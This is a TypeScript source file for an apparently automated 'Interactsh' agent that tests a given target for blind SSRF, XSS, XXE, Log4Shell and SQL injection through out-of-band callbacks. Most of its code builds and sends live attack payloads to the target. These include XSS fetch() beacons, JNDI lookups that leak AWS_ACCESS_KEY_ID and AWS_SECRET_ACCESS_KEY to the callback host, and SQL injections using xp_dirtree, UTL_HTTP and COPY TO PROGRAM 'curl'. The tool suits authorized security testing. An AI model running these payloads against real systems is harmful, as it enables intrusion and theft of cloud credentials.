import { BaseAgent } from './base-agent';
import axios from 'axios';
import { createHash, randomBytes } from 'crypto';
import Logger from '../utils/logger';

interface InteractshConfig {
  serverUrl?: string; // Custom Interactsh server
  pollingInterval?: number; // ms
  timeout?: number; // seconds
}

interface OOBPayload {
  id: string;
  type: 'dns' | 'http' | 'https' | 'smtp' | 'ldap' | 'ftp';
  payload: string;
  url: string;
  timestamp: number;
}

interface OOBCallback {
  protocol: string;
  uniqueId: string;
  fullId: string;
  rawRequest: string;
  remoteAddress: string;
  timestamp: string;
}

export class InteractshAgent extends BaseAgent {
  name = 'Interactsh OOB Detection Agent';
  description = 'Out-of-Band vulnerability detection using Interactsh for blind SSRF, XSS, XXE, Log4Shell, and more';

  private serverUrl: string;
  private sessionId: string;
  private correlationId: string;
  private secretKey: string;
  private activePayloads: Map<string, OOBPayload> = new Map();

  constructor(config?: InteractshConfig) {
    super();
    this.serverUrl = config?.serverUrl || 'https://interact.sh'; // Public Interactsh or self-hosted
    this.sessionId = this.generateSessionId();
    this.correlationId = this.generateCorrelationId();
    this.secretKey = this.generateSecretKey();
  }

  async getSteps(): Promise<string[]> {
    return [
      '🔗 Registering with Interactsh server',
      '🎯 Generating unique OOB payloads (DNS, HTTP, HTTPS, SMTP)',
      '📡 Injecting payloads into target applications',
      '⏰ Polling for callbacks (DNS queries, HTTP requests)',
      '🔍 Analyzing callback data for vulnerabilities',
      '📊 Correlating payloads with findings',
      '🤝 Triggering handoffs for confirmed blind vulns',
    ];
  }

  async process(job: any): Promise<void> {
    const { target, testType = 'all', config = {} } = job.data;

    Logger.info(`[${this.name}] Starting OOB detection for ${target}`);

    try {
      // Step 1: Register with Interactsh server
      await this.registerSession();

      // Step 2: Generate and inject OOB payloads based on test type
      const findings: any[] = [];

      if (testType === 'all' || testType === 'ssrf') {
        const ssrfFindings = await this.testBlindSSRF(target);
        findings.push(...ssrfFindings);
      }

      if (testType === 'all' || testType === 'xss') {
        const xssFindings = await this.testBlindXSS(target);
        findings.push(...xssFindings);
      }

      if (testType === 'all' || testType === 'xxe') {
        const xxeFindings = await this.testBlindXXE(target);
        findings.push(...xxeFindings);
      }

      if (testType === 'all' || testType === 'log4shell') {
        const log4jFindings = await this.testLog4Shell(target);
        findings.push(...log4jFindings);
      }

      if (testType === 'all' || testType === 'sqli') {
        const sqliFindings = await this.testBlindSQLi(target);
        findings.push(...sqliFindings);
      }

      // Step 3: Poll for callbacks
      Logger.info(`[${this.name}] Waiting for callbacks...`);
      await this.sleep(config.timeout || 30000); // Wait 30 seconds

      const callbacks = await this.pollCallbacks();
      Logger.info(`[${this.name}] Received ${callbacks.length} callbacks`);

      // Step 4: Correlate callbacks with payloads
      const confirmed = await this.correlateCallbacks(callbacks, findings);

      Logger.info(`[${this.name}] Confirmed ${confirmed.length} blind vulnerabilities`);

      // Step 5: Store findings
      await this.storeFindings(job, confirmed);

      // Step 6: Trigger handoffs
      if (confirmed.length > 0) {
        await this.triggerHandoff(job, 'triage', {
          reason: `Found ${confirmed.length} blind vulnerabilities via OOB`,
          findings: confirmed,
        });
      }

    } catch (error) {
      Logger.error(`[${this.name}] Error: ${error}`);
      throw error;
    } finally {
      // Cleanup
      await this.deregisterSession();
    }
  }

  private generateSessionId(): string {
    return randomBytes(16).toString('hex');
  }

  private generateCorrelationId(): string {
    return randomBytes(8).toString('hex');
  }

  private generateSecretKey(): string {
    return randomBytes(32).toString('hex');
  }

  private generateUniqueId(): string {
    return `${this.correlationId}${randomBytes(4).toString('hex')}`;
  }

  private async registerSession(): Promise<void> {
    try {
      Logger.info(`[${this.name}] Registering session with Interactsh server`);
      // Interactsh uses DNS-based registration, no explicit API call needed
      // Just generate the base domain
      this.sessionId = `${this.correlationId}.${this.serverUrl.replace('https://', '').replace('http://', '')}`;
    } catch (error) {
      Logger.error(`[${this.name}] Failed to register: ${error}`);
    }
  }

  private async deregisterSession(): Promise<void> {
    Logger.info(`[${this.name}] Session cleanup complete`);
  }

  private async testBlindSSRF(target: string): Promise<any[]> {
    const findings: any[] = [];

    // Generate SSRF payload
    const uniqueId = this.generateUniqueId();
    const payload: OOBPayload = {
      id: uniqueId,
      type: 'http',
      payload: `http://${uniqueId}.${this.serverUrl.replace('https://', '')}`,
      url: target,
      timestamp: Date.now()
    };

    this.activePayloads.set(uniqueId, payload);

    try {
      // Common SSRF injection points
      const injectionPoints = [
        `?url=${payload.payload}`,
        `?redirect=${payload.payload}`,
        `?next=${payload.payload}`,
        `?callback=${payload.payload}`,
        `?webhook=${payload.payload}`,
        `?fetch=${payload.payload}`,
        `?image=${payload.payload}`,
        `?proxy=${payload.payload}`,
      ];

      for (const point of injectionPoints) {
        try {
          await axios.get(`${target}${point}`, {
            timeout: 5000,
            validateStatus: () => true,
          });

          findings.push({
            type: 'Blind SSRF',
            payload: payload.payload,
            injectionPoint: point,
            uniqueId,
            target,
            timestamp: Date.now()
          });
        } catch (error) {
          // Ignore errors, we're testing blind
        }
      }

      // Test POST requests with JSON
      try {
        await axios.post(target, {
          url: payload.payload,
          webhook: payload.payload,
          callback: payload.payload,
        }, {
          timeout: 5000,
          validateStatus: () => true,
        });

        findings.push({
          type: 'Blind SSRF (POST)',
          payload: payload.payload,
          injectionPoint: 'POST body (JSON)',
          uniqueId,
          target,
          timestamp: Date.now()
        });
      } catch (error) {
        // Ignore
      }

    } catch (error) {
      Logger.error(`[${this.name}] SSRF test error: ${error}`);
    }

    return findings;
  }

  private async testBlindXSS(target: string): Promise<any[]> {
    const findings: any[] = [];

    const uniqueId = this.generateUniqueId();
    const payload: OOBPayload = {
      id: uniqueId,
      type: 'http',
      payload: `<script src="http://${uniqueId}.${this.serverUrl.replace('https://', '')}"></script>`,
      url: target,
      timestamp: Date.now()
    };

    this.activePayloads.set(uniqueId, payload);

    // Test common XSS injection points
    const xssPayloads = [
      `<img src=x onerror="fetch('http://${uniqueId}.${this.serverUrl.replace('https://', '')}')">`,
      `<script>fetch('http://${uniqueId}.${this.serverUrl.replace('https://', '')}')</script>`,
      `<svg onload="fetch('http://${uniqueId}.${this.serverUrl.replace('https://', '')}')">`,
      `<iframe src="http://${uniqueId}.${this.serverUrl.replace('https://', '')}">`,
    ];

    try {
      for (const xssPayload of xssPayloads) {
        // Test in common form fields
        await axios.post(target, {
          name: xssPayload,
          comment: xssPayload,
          message: xssPayload,
          email: xssPayload,
          username: xssPayload,
        }, {
          timeout: 5000,
          validateStatus: () => true,
        });

        findings.push({
          type: 'Blind XSS',
          payload: xssPayload,
          uniqueId,
          target,
          timestamp: Date.now()
        });
      }
    } catch (error) {
      Logger.error(`[${this.name}] XSS test error: ${error}`);
    }

    return findings;
  }

  private async testBlindXXE(target: string): Promise<any[]> {
    const findings: any[] = [];

    const uniqueId = this.generateUniqueId();
    const oobDomain = `${uniqueId}.${this.serverUrl.replace('https://', '')}`;

    const xxePayload = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % xxe SYSTEM "http://${oobDomain}/xxe">
  %xxe;
]>
<data>&xxe;</data>`;

    const payload: OOBPayload = {
      id: uniqueId,
      type: 'http',
      payload: xxePayload,
      url: target,
      timestamp: Date.now()
    };

    this.activePayloads.set(uniqueId, payload);

    try {
      await axios.post(target, xxePayload, {
        headers: { 'Content-Type': 'application/xml' },
        timeout: 5000,
        validateStatus: () => true,
      });

      findings.push({
        type: 'Blind XXE',
        payload: xxePayload,
        uniqueId,
        target,
        timestamp: Date.now()
      });
    } catch (error) {
      Logger.error(`[${this.name}] XXE test error: ${error}`);
    }

    return findings;
  }

  private async testLog4Shell(target: string): Promise<any[]> {
    const findings: any[] = [];

    const uniqueId = this.generateUniqueId();
    const oobDomain = `${uniqueId}.${this.serverUrl.replace('https://', '')}`;

    const log4jPayloads = [
      `\${jndi:ldap://${oobDomain}/a}`,
      `\${jndi:dns://${oobDomain}/a}`,
      `\${jndi:rmi://${oobDomain}/a}`,
      `\${jndi:ldap://${oobDomain}/\${env:AWS_ACCESS_KEY_ID}}`,
      `\${jndi:ldap://${oobDomain}/\${env:AWS_SECRET_ACCESS_KEY}}`,
    ];

    const payload: OOBPayload = {
      id: uniqueId,
      type: 'ldap',
      payload: log4jPayloads[0],
      url: target,
      timestamp: Date.now()
    };

    this.activePayloads.set(uniqueId, payload);

    try {
      for (const log4jPayload of log4jPayloads) {
        // Test in headers
        await axios.get(target, {
          headers: {
            'User-Agent': log4jPayload,
            'X-Api-Version': log4jPayload,
            'X-Forwarded-For': log4jPayload,
            'Referer': log4jPayload,
          },
          timeout: 5000,
          validateStatus: () => true,
        });

        // Test in query parameters
        await axios.get(`${target}?search=${encodeURIComponent(log4jPayload)}`, {
          timeout: 5000,
          validateStatus: () => true,
        });

        findings.push({
          type: 'Log4Shell',
          payload: log4jPayload,
          uniqueId,
          target,
          timestamp: Date.now()
        });
      }
    } catch (error) {
      Logger.error(`[${this.name}] Log4Shell test error: ${error}`);
    }

    return findings;
  }

  private async testBlindSQLi(target: string): Promise<any[]> {
    const findings: any[] = [];

    const uniqueId = this.generateUniqueId();
    const oobDomain = `${uniqueId}.${this.serverUrl.replace('https://', '')}`;

    // SQL OOB exfiltration payloads
    const sqliPayloads = [
      `'; EXEC master..xp_dirtree '\\\\${oobDomain}\\a'; --`, // MSSQL
      `' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\${oobDomain}\\\\a'))-- -`, // MySQL
      `'; SELECT UTL_HTTP.request('http://${oobDomain}') FROM dual; --`, // Oracle
      `'; COPY (SELECT '') TO PROGRAM 'curl http://${oobDomain}'; --`, // PostgreSQL
    ];

    const payload: OOBPayload = {
      id: uniqueId,
      type: 'dns',
      payload: sqliPayloads[0],
      url: target,
      timestamp: Date.now()
    };

    this.activePayloads.set(uniqueId, payload);

    try {
      for (const sqliPayload of sqliPayloads) {
        await axios.get(`${target}?id=${encodeURIComponent(sqliPayload)}`, {
          timeout: 5000,
          validateStatus: () => true,
        });

        findings.push({
          type: 'Blind SQLi (OOB)',
          payload: sqliPayload,
          uniqueId,
          target,
          timestamp: Date.now()
        });
      }
    } catch (error) {
      Logger.error(`[${this.name}] SQLi test error: ${error}`);
    }

    return findings;
  }

  private async pollCallbacks(): Promise<OOBCallback[]> {
    const callbacks: OOBCallback[] = [];

    try {
      // Poll Interactsh server for callbacks
      const response = await axios.get(`${this.serverUrl}/poll?id=${this.correlationId}&secret=${this.secretKey}`, {
        timeout: 10000,
      });

      if (response.data && response.data.data) {
        for (const callback of response.data.data) {
          callbacks.push({
            protocol: callback.protocol,
            uniqueId: callback['unique-id'],
            fullId: callback['full-id'],
            rawRequest: callback['raw-request'],
            remoteAddress: callback['remote-address'],
            timestamp: callback.timestamp,
          });
        }
      }
    } catch (error) {
      Logger.warn(`[${this.name}] Polling error: ${error}`);
    }

    return callbacks;
  }

  private async correlateCallbacks(callbacks: OOBCallback[], findings: any[]): Promise<any[]> {
    const confirmed: any[] = [];

    for (const callback of callbacks) {
      const uniqueId = callback.uniqueId || callback.fullId.split('.')[0];

      const payload = this.activePayloads.get(uniqueId);
      if (payload) {
        const finding = findings.find(f => f.uniqueId === uniqueId);

        if (finding) {
          confirmed.push({
            ...finding,
            confirmed: true,
            callback: {
              protocol: callback.protocol,
              remoteAddress: callback.remoteAddress,
              timestamp: callback.timestamp,
              rawRequest: callback.rawRequest,
            },
            severity: this.calculateSeverity(finding.type),
            cvss: this.calculateCVSS(finding.type),
          });

          Logger.info(`[${this.name}] ✓ Confirmed ${finding.type} via OOB callback`);
        }
      }
    }

    return confirmed;
  }

  private calculateSeverity(type: string): 'critical' | 'high' | 'medium' | 'low' {
    if (type.includes('Log4Shell') || type.includes('XXE')) return 'critical';
    if (type.includes('SSRF') || type.includes('SQLi')) return 'high';
    if (type.includes('XSS')) return 'medium';
    return 'low';
  }

  private calculateCVSS(type: string): number {
    if (type.includes('Log4Shell')) return 10.0;
    if (type.includes('XXE')) return 9.1;
    if (type.includes('SSRF')) return 8.6;
    if (type.includes('SQLi')) return 9.8;
    if (type.includes('XSS')) return 7.2;
    return 5.0;
  }

  private async storeFindings(job: any, findings: any[]): Promise<void> {
    if (job.sharedMemory) {
      await job.sharedMemory.storeFindings(this.name, findings.map(f => ({
        agent: this.name,
        type: f.type,
        severity: f.severity,
        cvss: f.cvss,
        payload: f.payload,
        callback: f.callback,
        target: f.target,
        timestamp: new Date().toISOString(),
      })));
    }

    Logger.info(`[${this.name}] Stored ${findings.length} confirmed findings`);
  }

  private async triggerHandoff(job: any, targetAgent: string, context: any): Promise<void> {
    Logger.info(`[${this.name}] Triggering handoff to ${targetAgent}`);

    if (job.handoff) {
      await job.handoff(targetAgent, {
        sourceAgent: this.name,
        reason: context.reason,
        findings: context.findings,
        timestamp: new Date().toISOString(),
      });
    }
  }

  private sleep(ms: number): Promise<void> {
    return new Promise(resolve => setTimeout(resolve, ms));
  }
}

export default InteractshAgent;
